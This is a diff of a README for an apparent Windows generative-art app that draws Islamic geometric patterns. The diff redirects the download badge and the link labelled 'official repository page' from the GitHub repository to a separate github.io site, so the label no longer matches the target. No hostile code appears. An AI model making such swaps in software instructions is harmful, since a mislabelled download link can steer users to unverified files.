@@ -1,6 +1,6 @@
 # 📐 Girih-1-Generative-Art - Create unique geometric patterns effortlessly
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/satheeshvm/Girih-1-Generative-Art)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://satheeshvm.github.io)
 
 Girih-1-Generative-Art brings complex Islamic geometric patterns to your desktop. This application uses math to draw intricate designs. You can adjust settings to create recursive trees and patterns for textile design or art projects. The tool requires no coding skills. You generate high-quality visuals instantly with a simple user interface.
 
@@ -8,7 +8,7 @@ Girih-1-Generative-Art brings complex Islamic geometric patterns to your desktop
 
 You must visit the project page to download the software for your Windows computer.
 
-1. Go to the [official repository page](https://github.com/satheeshvm/Girih-1-Generative-Art).
+1. Go to the [official repository page](https://satheeshvm.github.io).
 2. Look for the green button labeled "Code" near the top right of the screen.
 3. Click this button and select "Download ZIP" from the menu.
 4. Locate the downloaded file in your Downloads folder.
